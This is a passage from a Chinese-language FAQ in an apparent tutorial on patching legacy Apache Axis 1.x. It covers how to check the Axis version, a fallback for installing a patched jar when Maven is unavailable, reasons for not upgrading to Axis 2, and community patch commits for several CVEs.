### Q5：如何在项目中查看当前使用的 Axis 版本？

在 `build.gradle` 中搜索 `axis` 相关依赖，或者通过 Gradle 依赖报告：

```batch
gradlew.bat dependencies --configuration runtimeClasspath
```

### Q6：Maven 安装 patched jar 报错

如果电脑上没有安装 Maven，或者网络不通，脚本会自动回退到把 jar 复制到 `lib/` 目录的方式。也可以手动复制。

### Q7：为什么不直接升级到 Axis 2？

Axis 2 是架构完全重写的版本，API 和 Axis 1.x 不兼容。如果现有代码是基于 Axis 1.x 写的，升级成本很高。对于遗留系统，打补丁是更现实的选择。但如果是新项目，建议直接用 Axis 2 或 Spring WebService。

### Q8：这些补丁是官方发布的吗？

不是。Apache Axis 1.x 已于 2011 年 EOL（停止维护），Apache 官方不会发布任何 1.x 版本的补丁。本教程中的补丁代码来自 Apache Axis 的 GitHub 存档仓库（`apache/axis-axis1-java`）中的社区提交：

| CVE | 社区补丁地址 |
|-----|------------|
| CVE-2023-40743 | `commit 7e66753` + `commit 685c309` |
| CVE-2012-5784 + CVE-2014-3596 | `AXIS-2883` + `AXIS-2905` |
